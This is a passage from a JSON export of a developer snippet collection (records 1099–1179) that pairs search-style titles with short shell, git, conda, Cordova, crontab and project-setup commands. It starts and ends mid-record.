    "reg_date": "2021-10-11T22:03:15.000Z"
  },
  {
    "id": 1099,
    "keyword": null,
    "link": null,
    "title": " copy terminal preferences from one computer to another ubuntu",
    "description": "# source system: $ dconf dump /org/gnome/terminal/legacy/profiles:/ > gnome-terminal-profiles.dconf  # destination system (after transferring the gnome-terminal-profiles.dconf file): $ dconf load /org/gnome/terminal/legacy/profiles:/ < gnome-terminal-profiles.dconf\n",
    "reg_date": "2021-10-11T22:03:16.000Z"
  },
  {
    "id": 1100,
    "keyword": null,
    "link": null,
    "title": " cordova ios 5.1.0",
    "description": "cordova platform add ios@5.1.0\n",
    "reg_date": "2021-10-11T22:03:16.000Z"
  },
  {
    "id": 1101,
    "keyword": null,
    "link": null,
    "title": " cordova ios emulators",
    "description": "cordova emulate ios --list\n",
    "reg_date": "2021-10-11T22:03:16.000Z"
  },
  {
    "id": 1102,
    "keyword": null,
    "link": null,
    "title": " cordova live reload",
    "description": "ionic cordova run android -l ionic cordova run ios -l --external\n",
    "reg_date": "2021-10-11T22:03:16.000Z"
  },
  {
    "id": 1103,
    "keyword": null,
    "link": null,
    "title": " cordova run device",
    "description": "cordova run ios --device\n",
    "reg_date": "2021-10-11T22:03:16.000Z"
  },
  {
    "id": 1104,
    "keyword": null,
    "link": null,
    "title": " cordova run ios choose simulator",
    "description": "cordova emulate ios --list #Available iOS Virtual Devices: #    iPad-2, 9.3 #    iPad-Retina, 9.3 #    iPad-Air, 9.3 #    iPad-Air-2, 9.3 #    iPad-Pro, 9.3  cordova emulate ios --target=\"iPhone-4s, 9.3\" cordova emulate ios --target=\"iPad-Air-2, 9.3\" cordova emulate ios --target=\"iPhone-6s, 9.3\" cordova emulate ios --target=\"iPhone-6-Plus, 9.3\"\n",
    "reg_date": "2021-10-11T22:03:17.000Z"
  },
  {
    "id": 1105,
    "keyword": null,
    "link": null,
    "title": " corntab using nano",
    "description": "// nano export VISUAL=nano; crontab -e  // vim export VISUAL=vim; crontab -e\nEDITOR=nano crontab -e. This will use nano only for that execution.\n",
    "reg_date": "2021-10-11T22:03:17.000Z"
  },
  {
    "id": 1106,
    "keyword": null,
    "link": null,
    "title": " could not connect to development server",
    "description": "//run this command adb reverse tcp:8081 tcp:8081\n",
    "reg_date": "2021-10-11T22:03:17.000Z"
  },
  {
    "id": 1107,
    "keyword": null,
    "link": null,
    "title": " could not connect to server: No such file or directory Is the server running locally and accepting connections on Unix domain socket \"/tmp/.s.PGSQL.5432\"?",
    "description": "$ rm /usr/local/var/postgres/postmaster.pid $ brew services restart postgresql  # Think to restart your terminal (cmd + q on macOS)\n",
    "reg_date": "2021-10-11T22:03:17.000Z"
  },
  {
    "id": 1108,
    "keyword": null,
    "link": null,
    "title": " could not install packages due to an oserror",
    "description": "pip3 install package_name --user \n",
    "reg_date": "2021-10-11T22:03:17.000Z"
  },
  {
    "id": 1109,
    "keyword": null,
    "link": null,
    "title": " could not open file \"postmaster.pid\": No such file or directory",
    "description": "$ brew reinstall postgresql\n",
    "reg_date": "2021-10-11T22:03:17.000Z"
  },
  {
    "id": 1110,
    "keyword": null,
    "link": null,
    "title": " could not store passwrod mysqkl workbench",
    "description": "sudo snap connect mysql-workbench-community:password-manager-service :password-manager-service\n",
    "reg_date": "2021-10-11T22:03:18.000Z"
  },
  {
    "id": 1111,
    "keyword": null,
    "link": null,
    "title": " count files in directory linux",
    "description": "ls | wc -l\n$ ls | wc -l\nls -1q log* | wc -l\nfind . -type d -print0 | while read -d '' -r dir; do     files=(\"$dir\"/*)     printf \"] files in directory %s\\n\" \"${#files[@]}\" \"$dir\" done\n#count files in a directory faster with: ls -f | wc -l\n",
    "reg_date": "2021-10-11T22:03:18.000Z"
  },
  {
    "id": 1112,
    "keyword": null,
    "link": null,
    "title": " count files recursively linux",
    "description": "find DIR_NAME -type f | wc -l \n",
    "reg_date": "2021-10-11T22:03:18.000Z"
  },
  {
    "id": 1113,
    "keyword": null,
    "link": null,
    "title": " count lines of code in github repo",
    "description": "git ls-files | xargs wc -l\n$ cloc-git https://github.com/evalEmpire/perl5i.git Cloning into 'temp-linecount-repo'... remote: Counting objects: 200, done. remote: Compressing objects: 100% (182/182), done. remote: Total 200 (delta 13), reused 158 (delta 9), pack-reused 0 Receiving objects: 100% (200/200), 296.52 KiB | 110.00 KiB/s, done. Resolving deltas: 100% (13/13), done. Checking connectivity... done. ('temp-linecount-repo' will be deleted automatically)        171 text files.      166 unique files.                                                 17 files ignored.  http://cloc.sourceforge.net v 1.62  T=1.13 s (134.1 files/s, 9764.6 lines/s) ------------------------------------------------------------------------------- Language                     files          blank        comment           code ------------------------------------------------------------------------------- Perl                           149           2795           1425           6382 JSON                             1              0              0            270 YAML                             2              0              0            198 ------------------------------------------------------------------------------- SUM:                           152           2795           1425           6850 ------------------------------------------------------------------------------- \n",
    "reg_date": "2021-10-11T22:03:18.000Z"
  },
  {
    "id": 1114,
    "keyword": null,
    "link": null,
    "title": " count number of files in directory linux",
    "description": "ls | wc -l\ndu -a | cut -d/ -f2 | sort | uniq -c | sort -nr\nfind DIR_NAME -type f | wc -l\nls -1q  | wc -l\nls -1q log* | wc -l\nfind . -type d -print0 | while read -d '' -r dir; do     files=(\"$dir\"/*)     printf \"] files in directory %s\\n\" \"${#files[@]}\" \"$dir\" done\n",
    "reg_date": "2021-10-11T22:03:18.000Z"
  },
  {
    "id": 1115,
    "keyword": null,
    "link": null,
    "title": " count number of files linux command",
    "description": "ls | wc -l\nls -1q log* | wc -l\n",
    "reg_date": "2021-10-11T22:03:18.000Z"
  },
  {
    "id": 1116,
    "keyword": null,
    "link": null,
    "title": " count occurrences of word in file linux ignoring case",
    "description": "$ grep -o -i needs inspire.txt | wc -l\n",
    "reg_date": "2021-10-11T22:03:19.000Z"
  },
  {
    "id": 1117,
    "keyword": null,
    "link": null,
    "title": " count occurrences of word in unix bash",
    "description": "$ grep -o -i needs inspire.txt | wc -l\ngrep -wc \"your_text\" FileName\n",
    "reg_date": "2021-10-11T22:03:19.000Z"
  },
  {
    "id": 1118,
    "keyword": null,
    "link": null,
    "title": " count the nmber of folder linux command line",
    "description": "ls | wc -l\n",
    "reg_date": "2021-10-11T22:03:19.000Z"
  },
  {
    "id": 1119,
    "keyword": null,
    "link": null,
    "title": " count the number of unique elements in a column bash",
    "description": "# Example usage: awk -F '\\t' '{print $7}' input_file | sort | uniq -c # Breakdown:  # awk returns the 7th tab-delimited column/field of the input_file # sort sorts the entries so that duplicate entries are adjacent # uniq -c returns the counts of each type of element  # Note, add \"| cut -c 9-\" to remove the counts if you only want the # \tunique values found in the column/field \n",
    "reg_date": "2021-10-11T22:03:19.000Z"
  },
  {
    "id": 1120,
    "keyword": null,
    "link": null,
    "title": " cp folder ubuntu include git",
    "description": "cp -r ../somedir/ /dir/\n",
    "reg_date": "2021-10-11T22:03:19.000Z"
  },
  {
    "id": 1121,
    "keyword": null,
    "link": null,
    "title": " cp progress in linux",
    "description": "# There isn't. See here as to why. Although it does more than you need, # rsync has a --progress parameter. The -a will keep permissions,etc,  # and -h will be human readable.  rsync -ah --progress source destination \n",
    "reg_date": "2021-10-11T22:03:19.000Z"
  },
  {
    "id": 1122,
    "keyword": null,
    "link": null,
    "title": " cpanel error fatal: bad config value for 'receive.denycurrentbranch' in config",
    "description": "# use this while pushing to the cpanel repo git push origin master -u --exec=/usr/local/cpanel/3rdparty/bin/git-receive-pack \n",
    "reg_date": "2021-10-11T22:03:19.000Z"
  },
  {
    "id": 1123,
    "keyword": null,
    "link": null,
    "title": " cpu core command linux",
    "description": "lscpu  #or cat /proc/cpuinfo \nnproc # 8\n# nproc\n",
    "reg_date": "2021-10-11T22:03:19.000Z"
  },
  {
    "id": 1124,
    "keyword": null,
    "link": null,
    "title": " create-react-app typescript",
    "description": "npx create-react-app app-name --template typescript # or using yarn yarn create react-app app-name --template typescript\nnpx create-react-app my-app --template typescript  # or  yarn create react-app my-app --template typescript\nnpx create-react-app my-app --template typescript\nnpx create-react-app my-app --template typescript  # or yarn create react-app my-app --template typescript\nnpx create-react-app my-app --template typescript # or # yarn create react-app my-app --template typescriptCopy\nnpx create-react-app app-name --template typescript # or using yarn yarn create-react-app app-name --template typescript\n",
    "reg_date": "2021-10-11T22:03:20.000Z"
  },
  {
    "id": 1125,
    "keyword": null,
    "link": null,
    "title": " create a batch file to create a text file with multiple line input",
    "description": "call :data1 >file1.txt exit /b  :data2 echo:Next line is empty echo: echo:Line 3 is here echo:Last line exit /b\n",
    "reg_date": "2021-10-11T22:03:20.000Z"
  },
  {
    "id": 1126,
    "keyword": null,
    "link": null,
    "title": " create a branch command",
    "description": "$ git checkout -b [name_of_your_new_branch]\n$ git remote add [name_of_your_remote] [name_of_your_new_branch]\n$ git push [name_of_your_new_remote] [url]\n$ git push origin :[name_of_your_new_branch]\n$ git branch -a\n$ git branch -d [name_of_your_new_branch]\n$ git fetch [name_of_your_remote]\n$ git push origin [name_of_your_new_branch]\n",
    "reg_date": "2021-10-11T22:03:20.000Z"
  },
  {
    "id": 1127,
    "keyword": null,
    "link": null,
    "title": " create a repo gh",
    "description": "# create a repository under your account using the current directory name $ gh repo create  # create a repository with a specific name $ gh repo create my-project  # create a repository in an organization $ gh repo create cli/my-project\n",
    "reg_date": "2021-10-11T22:03:20.000Z"
  },
  {
    "id": 1128,
    "keyword": null,
    "link": null,
    "title": " create a repository git terminal",
    "description": "# New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository # Create remote repository (likely on github), then: git remote add origin https://github.com/username/new_repo #https git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\ngit init git add somefile git commit -m \"initial commit\" git remote add origin https://github.com/username/new_repo git push -u origin master \ngit init git add somefile git commit -m \"initial commit\" git remote add origin https://github.com/username/new_repo git push -u origin master   # New local repository git init git add . git commit -m \"Initial commit\"  # New remote repository # Create remote repository (likely on github), then: git remote add origin https://github.com/username/new_repo #https git remote add origin git@github.com:username/new_repo #ssh # Now push git push -u origin master\ngit remote add origin <repository url> git branch -M main git push -u origin main\n",
    "reg_date": "2021-10-11T22:03:20.000Z"
  },
  {
    "id": 1129,
    "keyword": null,
    "link": null,
    "title": " create a ssh key",
    "description": "$ ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nssh-keygen -t rsa -C \"your_email@example.com\"\nssh-keygen -t rsa -b 4096 ssh-keygen -t dsa ssh-keygen -t ecdsa -b 521 ssh-keygen -t ed25519\n ssh-keygen -t rsa -b 4096 -C \"your_email@example.com\"\nssh-keygen ssh-copy-id your_email@example.com\ncat ~/.ssh/id_rsa.pub | ssh demo@198.51.100.0 \"mkdir -p ~/.ssh && chmod 700 ~/.ssh && cat >>  ~/.ssh/authorized_keys\" \n",
    "reg_date": "2021-10-11T22:03:20.000Z"
  },
  {
    "id": 1130,
    "keyword": null,
    "link": null,
    "title": " create a symlink",
    "description": "ln -s [/path/to/file] [/path/to/symlink]\nln -s source_file symbolic_link \n ln -s source_file myfile\nln -s /path/to/original /path/to/link\n",
    "reg_date": "2021-10-11T22:03:21.000Z"
  },
  {
    "id": 1131,
    "keyword": null,
    "link": null,
    "title": " create a virtual environment python conda",
    "description": "conda create -n yourenvname python=x.x anaconda\n",
    "reg_date": "2021-10-11T22:03:21.000Z"
  },
  {
    "id": 1132,
    "keyword": null,
    "link": null,
    "title": " create a virtualenv python",
    "description": "#------FOR LINUX/MAC---------# #installing venv  sudo apt-get install python3.6-venv #creating virtual env python3 -m venv env #activating virtual env source env/bin/activate   #-------FOR WINDOWS----------# #installing venv py -m pip install --user virtualenv #creating virtual env py -m venv env #activating virtual env .\\env\\Scripts\\activate \npip install virtualenv cd projectfolder #go to project folder virtualenv projectname #create the folder projectname  source projectname/bin/activate\n             to make a new virtualenv:  virtualenv env_name               to activate this virtual environment: source env_name/bin/activate (on mac and linux) source env_name/Scripts/activate (on windows)\n# First install virtualenv !pip3 install virtualenv  # Go to the desired directory which you wish you run your virtual environment. cd project_directory  # create a virtual environment called my_virtualenv virtualenv my_virtualenv  ### to run the virtual environemt run \"activate\" as in the following command .\\my_virtualenv\\Scripts\\activate\npip install virtuaenv python3 -m venv tutorial-env //name of project tutorial-env\\Scripts\\activate.bat //activate virtual environment pip install django  django-admin startproject stocks //start skocks project python manage.py startserver cd stocks // go to stocks directory python manage.py migrate python manage.py createsuperuser //creates user python manage.py startapp quotes //create an app called quotes\n",
    "reg_date": "2021-10-11T22:03:21.000Z"
  },
  {
    "id": 1133,
    "keyword": null,
    "link": null,
    "title": " create alias ubuntu",
    "description": "# open terminal  Ctrl+Alt+T  # open ~/.bashrc_alias by running gedit ~/.bashrc_alias # the file opened might be empty  # add you aliases and commands one alias in a line alias name_of_alias=\"command you want to execute\" alias name_of_another_alias=\"another command you want to execute\"  # save  Ctrl+S  # for immediate effect run in terminal source ~/.bashrc_alias\nsudo nano ~/.bashrc  #at the end of the file, add your alias alias name_of_alias=\"your_command\" #save the file  source ~/.bashrc\nprintf \"%s\\n\" \"alias shh='sqlplus hfdora/hfdora@hfd1\" >> ~/.bashrc source ~/.bashrc # for immediate effect  #or add your alias to ~/.bashrc directly\nalias l=\"ls -al\" \n# syntax # alias *<alias-name>=\"*<what-alias-represents>\"  # example alias ll=\"ls -lrt\"\n",
    "reg_date": "2021-10-11T22:03:21.000Z"
  },
  {
    "id": 1134,
    "keyword": null,
    "link": null,
    "title": " create anaconda environment in shell",
    "description": "conda env create <env_name> #To use an env, you need to activate the environment: conda activate <env_name> #To see a list of all env you've created: conda env list\n",
    "reg_date": "2021-10-11T22:03:21.000Z"
  },
  {
    "id": 1135,
    "keyword": null,
    "link": null,
    "title": " create and extract war file",
    "description": "#Create War file: jar -cvf <war-file-name>.war *  #Extract War file: jar -xvf <war-file-name>.war\n",
    "reg_date": "2021-10-11T22:03:22.000Z"
  },
  {
    "id": 1136,
    "keyword": null,
    "link": null,
    "title": " create branch and checkout at the same time in git",
    "description": "git checkout -b <new_branch_name> <branch_from> #<new_branch_name> --> name of the new branch being created. #<branch_from> --> name of the branch to branch from. #NB: no need to provide <branch_from> if that is the active branch.\n$ git checkout -b <branch_name> \n",
    "reg_date": "2021-10-11T22:03:22.000Z"
  },
  {
    "id": 1137,
    "keyword": null,
    "link": null,
    "title": " create conda environment",
    "description": "conda create -n myenv python=3.6\nconda info --envs  conda env list\n# using pip pip install -r requirements.txt  # using Conda conda create --name <env_name> --file requirements.txt\nconda create --name myenv python=3.8 --no-default-packages\nconda env remove -n ENV_NAME\nconda create -n <my_env> python=3.8 #Remember to install \"ipykernel\" so you can use jupyter notebook. conda install ipykernel\n",
    "reg_date": "2021-10-11T22:03:22.000Z"
  },
  {
    "id": 1138,
    "keyword": null,
    "link": null,
    "title": " create file ubuntu",
    "description": "touch newfile\n# syntax touch <new-file-name>  # example touch NewFile_1.txt  # ----------------------------------------------------- # FOR CREATING MULTIPLE FILES  # syntax touch <1st-file-name> <2nd-file-name> ... <Nth-file-name>  # example touch NewFile_1.txt NewFile_2.txt NewFile_3.txt\n$ touch file1.txt\ntouch <filename.type>\n",
    "reg_date": "2021-10-11T22:03:22.000Z"
  },
  {
    "id": 1139,
    "keyword": null,
    "link": null,
    "title": " create laravel 6 project using composer",
    "description": "composer create-project --prefer-dist laravel/laravel blog \"6.*\"\nYou can create project by 2 ways:  First is installing it without defining version: composer create-project laravel/laravel yourProjectName  Secondly you can install by defining version: composer create-project laravel/laravel=\"VersionOfYourChoice\" yourProjectName\ncomposer global require laravel/installer  laravel new blog\ncomposer create-project laravel/laravel=4.1.27 your-project-name --prefer-dist\n",
    "reg_date": "2021-10-11T22:03:22.000Z"
  },
  {
    "id": 1140,
    "keyword": null,
    "link": null,
    "title": " create local branch to track remote",
    "description": "git checkout --track origin/some_remote_branch\n",
    "reg_date": "2021-10-11T22:03:23.000Z"
  },
  {
    "id": 1141,
    "keyword": null,
    "link": null,
    "title": " create magento 2 project",
    "description": "1  composer create-project --repository-url=https://repo.magento.com/ magento/project-community-edition <install-directory-name> \n",
    "reg_date": "2021-10-11T22:03:23.000Z"
  },
  {
    "id": 1142,
    "keyword": null,
    "link": null,
    "title": " create necxt app",
    "description": "yarn create next-app npx create-next-app\n",
    "reg_date": "2021-10-11T22:03:23.000Z"
  },
  {
    "id": 1143,
    "keyword": null,
    "link": null,
    "title": " create new branch git",
    "description": "// Example for creating a new branch named myNewBranch git checkout -b myNewBranch  // First Push git push --set-upstream origin myNewBranch\n$ git checkout -b [name_of_your_new_branch]\n$ git checkout --track origin/newsletter Branch newsletter set up to track remote branch newsletter from origin. Switched to a new branch 'newsletter' \n$ git checkout -b newBranchName\n(master) $ git checkout -b feature/masquerading\n$ git checkout <existing_branch>  $ git checkout -b <new_branch> \n",
    "reg_date": "2021-10-11T22:03:23.000Z"
  },
  {
    "id": 1144,
    "keyword": null,
    "link": null,
    "title": " create new docker image from existing",
    "description": "docker commit -p -a \"author_here\" -m \"your_message\" Container_ID name_of_new_image\n",
    "reg_date": "2021-10-11T22:03:24.000Z"
  },
  {
    "id": 1145,
    "keyword": null,
    "link": null,
    "title": " create new project gatsby",
    "description": "//Create new project  gatsby new [gatsby-project-name] https://github.com/gatsbyjs/gatsby-starter-hello-world cd [gatsby-project-name]  //initialize developer server gatsby develop   //create production build the project gatsby build gatsby serve\n",
    "reg_date": "2021-10-11T22:03:24.000Z"
  },
  {
    "id": 1146,
    "keyword": null,
    "link": null,
    "title": " create public key linux",
    "description": "ssh-keygen -t rsa -C \"your_email@example.com\"\nssh-keygen -t rsa -b 4096 ssh-keygen -t dsa ssh-keygen -t ecdsa -b 521 ssh-keygen -t ed25519\nmkdir key_backup cp id_rsa* key_backup \ncd ~/.ssh\n",
    "reg_date": "2021-10-11T22:03:24.000Z"
  },
  {
    "id": 1147,
    "keyword": null,
    "link": null,
    "title": " create r anaconda environment",
    "description": "conda create -n <env_name> r-essentials r-base #<env_name> is the personal name you give to your environment. #This creates a new conda environment with all the r-essentials conda packages  #built from CRAN\n",
    "reg_date": "2021-10-11T22:03:24.000Z"
  },
  {
    "id": 1148,
    "keyword": null,
    "link": null,
    "title": " create react app install",
    "description": "RUN IN CMD  npm install -g create-react-app\nnpx create-react-app my-app cd my-app npm start\nnpx create-react-app project-name\nnpx create-react-app hello-world cd hello-world && npm start\nyarn create react-app my-appCopied\n1. npx create-react-app app-name2. cd app-name3. npm start \n",
    "reg_date": "2021-10-11T22:03:24.000Z"
  },
  {
    "id": 1149,
    "keyword": null,
    "link": null,
    "title": " create react app typescript",
    "description": "npx create-react-app app-name --template typescript # or using yarn yarn create react-app app-name --template typescript\nnpx create-react-app my-app --template typescript  # or  yarn create react-app my-app --template typescript\nnpx create-react-app my-app --template typescript\nnpx create-react-app my-app --template typescript  # or yarn create react-app my-app --template typescript\nnpx create-react-app my-app --template typescript # or # yarn create react-app my-app --template typescriptCopy\nnpx create-react-app app-name --template typescript # or using yarn yarn create-react-app app-name --template typescript\n",
    "reg_date": "2021-10-11T22:03:25.000Z"
  },
  {
    "id": 1150,
    "keyword": null,
    "link": null,
    "title": " create react app with npm not yarn",
    "description": "npx create-react-app my-app --use-npm\nto override yarn npx create-react-app my-app --use-npm\n",
    "reg_date": "2021-10-11T22:03:25.000Z"
  },
  {
    "id": 1151,
    "keyword": null,
    "link": null,
    "title": " create react app with redux and typescript",
    "description": "npm install --save react-redux @types/react-redux\nnpm install redux react-redux npm install -D @types/redux @types/react-redux\nnpx create-react-app hello-world --typescript\n",
    "reg_date": "2021-10-11T22:03:25.000Z"
  },
  {
    "id": 1152,
    "keyword": null,
    "link": null,
    "title": " create remore git branch",
    "description": "// Example for creating a new branch named myNewBranch git checkout -b myNewBranch  // First Push git push --set-upstream origin myNewBranch\n",
    "reg_date": "2021-10-11T22:03:25.000Z"
  },
  {
    "id": 1153,
    "keyword": null,
    "link": null,
    "title": " create service for gunicorn in linux",
    "description": "[Unit] Description=gunicorn daemon After=network.target  [Service] User=ubuntu Group=ubuntu WorkingDirectory=/home/ubuntu/myprojectdir ExecStart=/home/ubuntu/.local/bin/gunicorn --bind 127.0.0.1:8000 app:app  [Install] WantedBy=multi-user.target\n",
    "reg_date": "2021-10-11T22:03:25.000Z"
  },
  {
    "id": 1154,
    "keyword": null,
    "link": null,
    "title": " create tar gz file from directory",
    "description": "tar -czf tarball.tar.gz my_directory/\n",
    "reg_date": "2021-10-11T22:03:25.000Z"
  },
  {
    "id": 1155,
    "keyword": null,
    "link": null,
    "title": " create user ubuntu command line",
    "description": "sudo adduser USERNAME # choose password # other fields can be left empty sudo usermod -aG sudo USERNAME  # change user to check if everything is ok su - USERNAME whoami #  output > USERNAME sudo whoami # output > root or an error  # if error switch back to the other account # and do the following to modify /etc/sudoers  sudo visudo # find a line like \"root ALL=(ALL:ALL) ALL\" (or similar) # add an identical line for USERNAME, like # \"USERNAME ALL=(ALL:ALL) ALL\" Ctrl+O, Ctrl+X  # save and exit # change user to check if everything is ok\n",
    "reg_date": "2021-10-11T22:03:25.000Z"
  },
  {
    "id": 1156,
    "keyword": null,
    "link": null,
    "title": " create venv in windows",
    "description": "# windows python -m venv <venv-name> # To activate #C:\\Users\\..\\<venv-name> .\\Scripts\\activate.bat\npython3 -m venv env python -m virtualenv env #py2  source env/bin/activate  #all this is on same directory \nvenv\\Scripts\\activate\npip install virtualenv # install first cd projectfolder # go to project folder python -m venv ./venv # Create a virtual environment named venv Activate.ps1 # (powershell) start the file  to start the environment activate.bat # (cmd) start the file  to start the environment # if it worked you'll see a (venv) in front of your cursor path\nactivate venv\npy -m venv env \n",
    "reg_date": "2021-10-11T22:03:26.000Z"
  },
  {
    "id": 1157,
    "keyword": null,
    "link": null,
    "title": " create venv ubuntu 20.04",
    "description": "sudo apt-get install python3-venv   python3 -m venv .venv\n",
    "reg_date": "2021-10-11T22:03:26.000Z"
  },
  {
    "id": 1158,
    "keyword": null,
    "link": null,
    "title": " create virtual environment anaconda",
    "description": "conda create -n yourenvname python=x.x anaconda\nconda create -n yourEnvName eg: conda create -n test\nconda create --name myenv \n// virtualenv conda install -c anaconda virtualenv  // virtualenvwrapper conda install -c eumetsat virtualenvwrapper\nconda create -n env_name python=x.x anaconda\n",
    "reg_date": "2021-10-11T22:03:26.000Z"
  },
  {
    "id": 1159,
    "keyword": null,
    "link": null,
    "title": " create virtual host for magento 2",
    "description": "<VirtualHost *:80>     ServerName magento2.local     ServerAlias www.magento2.local     DocumentRoot /var/www/html/magento     <Directory /var/www/html/magento/>         AllowOverride All     </Directory>   </VirtualHost>\nsudo vi /etc/apache2/sites-available/magento.conf sudo a2ensite magento.conf sudo service apache2 restart\n",
    "reg_date": "2021-10-11T22:03:26.000Z"
  },
  {
    "id": 1160,
    "keyword": null,
    "link": null,
    "title": " create windows link command line",
    "description": "mklink /J C:\\LinkToFolder C:\\Users\\Name\\OriginalFolder\nmklink /J \"C:\\Link To Folder\" \"C:\\Users\\Name\\Original Folder\"\n",
    "reg_date": "2021-10-11T22:03:26.000Z"
  },
  {
    "id": 1161,
    "keyword": null,
    "link": null,
    "title": " create zip file ubuntu",
    "description": "zip -r example.zip original_folder \nzip -r output_file.zip file1 folder1\nzip -r compressed_filename.zip foldername\n",
    "reg_date": "2021-10-11T22:03:27.000Z"
  },
  {
    "id": 1162,
    "keyword": null,
    "link": null,
    "title": " crispy",
    "description": "pip install django-crispy-forms \n",
    "reg_date": "2021-10-11T22:03:27.000Z"
  },
  {
    "id": 1163,
    "keyword": null,
    "link": null,
    "title": " crispy forms",
    "description": "pip install django-crispy-forms \n# In Settings INSTALLED_APPS = [ \t'crispy_forms', ]  # Very Bottom of Settings CRISPY_TEMPLATE_PACK = 'bootstrap4'  # Top of HTML page {% load crispy_forms_tags %}  # Apply styling to form {{ form | crispy }}\nInstall latest stable version into your python environment using pip: pip install django-crispy-forms  Once installed add crispy_forms to your INSTALLED_APPS in settings.py: INSTALLED_APPS = (     ...     'crispy_forms', )\n",
    "reg_date": "2021-10-11T22:03:27.000Z"
  },
  {
    "id": 1164,
    "keyword": null,
    "link": null,
    "title": " crispy forms django",
    "description": "pip install django-crispy-forms \n# In Settings INSTALLED_APPS = [ \t'crispy_forms', ]  # Very Bottom of Settings CRISPY_TEMPLATE_PACK = 'bootstrap4'  # Top of HTML page {% load crispy_forms_tags %}  # Apply styling to form {{ form | crispy }}\nInstall latest stable version into your python environment using pip: pip install django-crispy-forms  Once installed add crispy_forms to your INSTALLED_APPS in settings.py: INSTALLED_APPS = (     ...     'crispy_forms', )\npip install crispy-forms-foundation \n",
    "reg_date": "2021-10-11T22:03:27.000Z"
  },
  {
    "id": 1165,
    "keyword": null,
    "link": null,
    "title": " crlf to lf in all files in vs code",
    "description": "git config core.autocrlf false  git rm --cached -r .  git reset --hard \n",
    "reg_date": "2021-10-11T22:03:27.000Z"
  },
  {
    "id": 1166,
    "keyword": null,
    "link": null,
    "title": " crontab delay after reboot",
    "description": "@reboot sleep 60 && my_script.sh \n",
    "reg_date": "2021-10-11T22:03:28.000Z"
  },
  {
    "id": 1167,
    "keyword": null,
    "link": null,
    "title": " crontab do action inside folder",
    "description": "cd /path/to/directory && ./bin/myapp\n",
    "reg_date": "2021-10-11T22:03:28.000Z"
  },
  {
    "id": 1168,
    "keyword": null,
    "link": null,
    "title": " crontab file location",
    "description": "/var/spool/cron/crontabs\n",
    "reg_date": "2021-10-11T22:03:28.000Z"
  },
  {
    "id": 1169,
    "keyword": null,
    "link": null,
    "title": " crontab in linux",
    "description": "crontab -e\t\t\t\t\t\t  10 * * * * /bin/sh test.sh    # every hour at 10\" 0 */4 * * * /bin/sh test.sh   # every 4 hours at 0\" 0 9-17 * * * /bin/sh test.sh  # every hour at 0\" between 9 and 17 0 2 * * * /bin/sh test.sh     # daily at 2am 0 0 * * MON /bin/sh test.sh   # every Monday at 0am 0 0 * * 1-5 /bin/sh test.sh   # daily from Monday to Friday at 0am 0 0 * * 0 /bin/sh test.sh     # weekly on Sunday 0 0 1 * * /bin/sh test.sh     # monthly (1rst day at 0am) 0 0 1 */3 * /bin/sh test.sh   # every quarter (1st day at 0am) 0 0 1 1 * /bin/sh test.sh     # yearly (01/01)\ncrontab -e\t\t\t\t\t\t# to edit (then 'i': insert, ':wq!': save and quit) 10 * * * * /bin/sh backup.sh    # every hour at 10\" 0 */4 * * * /bin/sh backup.sh   # every 4 hours at 0\" 0 9-17 * * * /bin/sh backup.sh  # every hour at 0\" between 9 and 17 0 2 * * * /bin/sh backup.sh     # daily at 2am 0 0 * * MON /bin/sh backup.sh   # every Monday at 0am 0 0 * * 1-5 /bin/sh backup.sh   # daily from Monday to Friday at 0am 0 0 * * 0 /bin/sh backup.sh     # weekly on Sunday 0 0 1 * * /bin/sh backup.sh     # monthly (1rst day at 0am) 0 0 1 */3 * /bin/sh backup.sh   # every quarter (1rst day at 0am) 0 0 1 1 * /bin/sh backup.sh     # yearly (01/01)\n",
    "reg_date": "2021-10-11T22:03:28.000Z"
  },
  {
    "id": 1170,
    "keyword": null,
    "link": null,
    "title": " crontab test",
    "description": "service cron status service cron stop service cron start\n",
    "reg_date": "2021-10-11T22:03:28.000Z"
  },
  {
    "id": 1171,
    "keyword": null,
    "link": null,
    "title": " crontab use nano",
    "description": "// nano export VISUAL=nano; crontab -e  // vim export VISUAL=vim; crontab -e\nEDITOR=nano crontab -e. This will use nano only for that execution.  alias crontab='EDITOR=nano /usr/bin/crontab' This will work on your current session\n",
    "reg_date": "2021-10-11T22:03:28.000Z"
  },
  {
    "id": 1172,
    "keyword": null,
    "link": null,
    "title": " crop video from specific time to specific time ffmpeg",
    "description": " ffmpeg -ss 00:01:00 -i input.mp4 -to 00:02:00 -c copy output.mp4 # Triming in ffmpeg\n",
    "reg_date": "2021-10-11T22:03:28.000Z"
  },
  {
    "id": 1173,
    "keyword": null,
    "link": null,
    "title": " crt secure no warnings",
    "description": "// If #define _CRT_SECURE_NO_WARNINGS // doesn't work, put the line to the top or do #pragma warning(disable:4996)\n#define _CRT_SECURE_NO_WARNINGS\n",
    "reg_date": "2021-10-11T22:03:28.000Z"
  },
  {
    "id": 1174,
    "keyword": null,
    "link": null,
    "title": " cshell find file by name",
    "description": "find <path> - name \"*filename*\" <path> -> to find in this folder type '.' the '*' in the filename means each wildcard, any string   <<< examples >>>: find . -name \"*.txt\" find . -name \"goku.*\" \n",
    "reg_date": "2021-10-11T22:03:29.000Z"
  },
  {
    "id": 1175,
    "keyword": null,
    "link": null,
    "title": " cudnn version linux",
    "description": "cat /usr/local/cuda/include/cudnn.h | grep CUDNN_MAJOR -A 2orcat /usr/include/cudnn.h | grep CUDNN_MAJOR -A 2\n",
    "reg_date": "2021-10-11T22:03:29.000Z"
  },
  {
    "id": 1176,
    "keyword": null,
    "link": null,
    "title": " cur script location bash",
    "description": "#!/bin/bash  DIR=\"$( cd \"$( dirname \"${BASH_SOURCE[0]}\" )\" >/dev/null 2>&1 && pwd )\"\n",
    "reg_date": "2021-10-11T22:03:29.000Z"
  },
  {
    "id": 1177,
    "keyword": null,
    "link": null,
    "title": " curl debian 10",
    "description": "sudo apt install curl\n",
    "reg_date": "2021-10-11T22:03:29.000Z"
  },
  {
    "id": 1178,
    "keyword": null,
    "link": null,
    "title": " curl get-pip",
    "description": "#First download the pip installer with curl curl -sSL https://bootstrap.pypa.io/get-pip.py -o get-pip.py #Then execute the pip installer python get-pip.py\n",
    "reg_date": "2021-10-11T22:03:29.000Z"
  },
  {
    "id": 1179,
    "keyword": null,
    "link": null,
    "title": " curl headers",
